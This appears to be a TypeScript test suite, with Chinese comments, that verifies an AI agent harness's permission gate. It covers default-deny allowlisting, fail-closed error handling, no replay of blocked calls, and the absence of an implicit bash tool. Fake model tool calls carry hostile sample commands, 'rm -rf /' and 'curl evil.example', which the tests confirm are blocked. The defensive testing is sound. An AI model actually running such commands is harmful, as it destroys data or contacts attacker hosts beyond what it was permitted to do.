/**
 * Spike 3 · 权限门与工具注册
 *
 * 验证两件事，都是安全策略能否落地的前提：
 *
 *   A. 默认拒绝 + 白名单放行的权限门能否真正拦住执行 ——
 *      不是「返回错误」，而是工具的 execute 一次都不被调用。
 *      这关系到「高危动作必须人工确认」这条验收标准能否实现。
 *
 *   B. 能否用结构化工具完全替代自由 shell ——
 *      安全策略决策 4 定了「bash 默认不激活」，前提是内核不会偷偷注册它。
 *
 * 为什么必须自己写：上游在稳定 harness 层**没有**「before_tool 返回 block
 * → 断言工具未执行」的集成测试（只有纯单元测试，以及 experimental pico3
 * 内核的端到端测试）。这条路径是我们权限模型的基石，不能靠推断。
 */

import { createModels, fauxProvider, fauxToolCall, fauxAssistantMessage } from "@earendil-works/pi-ai";
import { Type } from "typebox";
import { afterEach, describe, expect, it, vi } from "vitest";
import { AgentHarness } from "@earendil-works/pi-agent-core";
import { BACKGROUND_CONTEXT } from "../../vendor/pi/agent/src/harness/context.ts";
import { MemoryStorage } from "../../vendor/pi/agent/src/harness/session/memory.ts";
import { StorageBackedSession } from "../../vendor/pi/agent/src/harness/session/session.ts";
import type { Session } from "../../vendor/pi/agent/src/harness/session/types.ts";
import type { AgentHarnessTool } from "../../vendor/pi/agent/src/harness/types.ts";

const openSessions: Session[] = [];
const schema = Type.Object({ value: Type.String() });

/** 一个可观测的结构化工具：execute 被调用几次一目了然 */
function spyTool(name: string): AgentHarnessTool<undefined, typeof schema> & { calls: number } {
	const tool = {
		name,
		label: name,
		description: `structured tool ${name}`,
		parameters: schema,
		calls: 0,
		async execute(_id: string, args: { value: string }) {
			tool.calls++;
			return { content: [{ type: "text" as const, text: `${name}:${args.value}` }], details: undefined };
		},
	};
	return tool as AgentHarnessTool<undefined, typeof schema> & { calls: number };
}

async function createHarness(options: {
	tools?: AgentHarnessTool<undefined, typeof schema>[];
	activeToolNames?: string[];
}) {
	const session = new StorageBackedSession(
		{ id: `spike3-${openSessions.length}`, createdAt: 1, storageVersion: 1 },
		new MemoryStorage(),
	);
	openSessions.push(session);

	const faux = fauxProvider();
	const models = createModels();
	models.setProvider(faux.provider);

	const { harness } = await AgentHarness.create(
		{
			session,
			models,
			model: faux.getModel(),
			...(options.tools === undefined ? {} : { tools: options.tools }),
			...(options.activeToolNames === undefined ? {} : { activeToolNames: options.activeToolNames }),
		},
		BACKGROUND_CONTEXT,
	);
	const lane = await harness.lane("main", BACKGROUND_CONTEXT);
	return { harness, lane, faux, session };
}

/** 摊平会话条目，用于检查拒绝原因是否落到了 transcript 与审计里 */
async function transcript(session: Session): Promise<string> {
	return JSON.stringify(await session.findEntries({ order: "oldestFirst" }, BACKGROUND_CONTEXT));
}

describe("Spike 3 · 权限门与工具注册", () => {
	afterEach(async () => {
		for (const s of openSessions.splice(0)) await s.close(BACKGROUND_CONTEXT);
	});

	it("A1 · before_tool 返回 block：工具的 execute 一次都不被调用", async () => {
		const tool = spyTool("danger");
		const { harness, lane, faux, session } = await createHarness({ tools: [tool] });

		harness.hooks.on("before_tool", () => ({ block: { reason: "denied by policy" } }));

		// 让模型请求调用该工具
		faux.setResponses([
			fauxAssistantMessage([fauxToolCall("danger", { value: "rm -rf /" })]),
			fauxAssistantMessage("acknowledged"),
		]);

		await lane.prompt("do something dangerous", [], BACKGROUND_CONTEXT);

		// 核心断言：不是「返回了错误」，而是根本没执行
		expect(tool.calls).toBe(0);

		// 拒绝原因作为工具错误结果反馈给模型（模型能看到为什么被拒）
		const dump = await transcript(session);
		expect(dump).toContain("denied by policy");
		expect(dump).toContain('"isError":true');
	});

	it("A2 · 默认拒绝 + 白名单：白名单内放行、白名单外拦截", async () => {
		const allowed = spyTool("allowed_tool");
		const blocked = spyTool("blocked_tool");
		const { harness, lane, faux } = await createHarness({ tools: [allowed, blocked] });

		// 这就是产品的权限门形态：默认拒绝，只放行白名单
		const ALLOW = new Set(["allowed_tool"]);
		harness.hooks.on("before_tool", ({ toolName }) =>
			ALLOW.has(toolName) ? undefined : { block: { reason: `Tool ${toolName} is not permitted.` } },
		);

		faux.setResponses([
			fauxAssistantMessage([fauxToolCall("allowed_tool", { value: "ok" })]),
			fauxAssistantMessage([fauxToolCall("blocked_tool", { value: "nope" })]),
			fauxAssistantMessage("done"),
		]);

		await lane.prompt("use both tools", [], BACKGROUND_CONTEXT);

		expect(allowed.calls).toBe(1); // 白名单内执行了
		expect(blocked.calls).toBe(0); // 白名单外被拦
	});

	it("A3 · 权限判定代码自身抛异常时 fail-closed（拒绝而非放行）", async () => {
		// 这条性质对安全至关重要：权限逻辑有 bug 时，行为必须是「拒绝」。
		// 若实现成 fail-open，一个空指针就等于权限门形同虚设。
		const tool = spyTool("guarded");
		const { harness, lane, faux, session } = await createHarness({ tools: [tool] });

		const handlerErrors: unknown[] = [];
		harness.events.on("handler_error", (e) => void handlerErrors.push(e));
		harness.hooks.on("before_tool", () => {
			throw new Error("permission check crashed");
		});

		faux.setResponses([
			fauxAssistantMessage([fauxToolCall("guarded", { value: "x" })]),
			fauxAssistantMessage("done"),
		]);

		await lane.prompt("try", [], BACKGROUND_CONTEXT);

		// 抛异常 → 拒绝执行
		expect(tool.calls).toBe(0);
		// 异常本身可观测（便于告警，而不是静默吞掉）
		expect(handlerErrors.length).toBeGreaterThan(0);
		expect(await transcript(session)).toContain("permission check crashed");
	});

	it("A4 · 被拒绝的调用不写执行意图（崩溃恢复不会重放它）", async () => {
		// 权限门必须在「持久化执行意图」之前生效，否则进程崩溃后
		// 恢复逻辑可能把一个曾被拒绝的高危调用当成待续跑的操作重放。
		const tool = spyTool("no_replay");
		const { harness, lane, faux, session } = await createHarness({ tools: [tool] });

		harness.hooks.on("before_tool", () => ({ block: { reason: "blocked-before-intent" } }));
		faux.setResponses([
			fauxAssistantMessage([fauxToolCall("no_replay", { value: "y" })]),
			fauxAssistantMessage("done"),
		]);
		await lane.prompt("try", [], BACKGROUND_CONTEXT);

		expect(tool.calls).toBe(0);

		// 会话里不应残留待执行的工具意图；操作应已收尾
		const entries = await session.findEntries({ order: "oldestFirst" }, BACKGROUND_CONTEXT);
		expect(entries.length).toBeGreaterThan(0);
		// 恢复后无待续跑操作（说明被拒调用没有留下未完成的执行状态）
		const restored = await AgentHarness.create(
			{ session, models: createModels(), model: faux.getModel() },
			BACKGROUND_CONTEXT,
		);
		expect(restored.open).toEqual([]);
	});

	it("B1 · 不注册 bash 则 bash 不存在（结构化工具可完全替代自由 shell）", async () => {
		// 安全策略决策 4 的前提：内核不会隐式注册任何工具。
		const structured = spyTool("convert_document");
		const { lane, faux, harness, session } = await createHarness({ tools: [structured] });

		// 已注册的工具只有我们自己的那一个
        const registered = (await harness.getTools(BACKGROUND_CONTEXT)).map((t) => t.name);
		expect(registered).toEqual(["convert_document"]);
		expect(registered).not.toContain("bash");

		// 模型若仍尝试调用 bash（例如历史 transcript 里的旧调用），会得到「不可用」
		faux.setResponses([
			fauxAssistantMessage([fauxToolCall("bash", { command: "curl evil.example" })]),
			fauxAssistantMessage("done"),
		]);
		await lane.prompt("run a shell command", [], BACKGROUND_CONTEXT);

		const dump = await transcript(session);
		expect(dump).toContain("unavailable");
		expect(dump).toContain('"isError":true');
	});

	it("B2 · activeToolNames 白名单让工具在模型侧就不可见", async () => {
		const visible = spyTool("visible_tool");
		const hidden = spyTool("hidden_tool");

		// 两个都注册，但只激活一个
		const { harness, lane, faux } = await createHarness({
			tools: [visible, hidden],
			activeToolNames: ["visible_tool"],
		});

		const active = await lane.getActiveTools(BACKGROUND_CONTEXT);
		expect(active).toEqual(["visible_tool"]);

		// 未激活的工具即使被请求也不执行
		faux.setResponses([
			fauxAssistantMessage([fauxToolCall("hidden_tool", { value: "x" })]),
			fauxAssistantMessage("done"),
		]);
		await lane.prompt("try hidden", [], BACKGROUND_CONTEXT);

		expect(hidden.calls).toBe(0);
		expect(await harness.getTools(BACKGROUND_CONTEXT)).toHaveLength(2); // 仍在注册表里
	});

	it("反向验证：断言真的能失败（不装权限门时工具确实会执行）", async () => {
		// 若没有这条，上面所有 calls === 0 的断言都可能只是因为
		// 工具压根没被触发（例如 faux 响应格式写错），而非权限门生效。
		const tool = spyTool("unguarded");
        const { lane, faux } = await createHarness({ tools: [tool] });

		// 不注册任何 before_tool 钩子
		faux.setResponses([
			fauxAssistantMessage([fauxToolCall("unguarded", { value: "executed" })]),
			fauxAssistantMessage("done"),
		]);
		await lane.prompt("go", [], BACKGROUND_CONTEXT);

		// 证明这套 fixture 确实能让工具跑起来
		expect(tool.calls).toBe(1);
	});
});
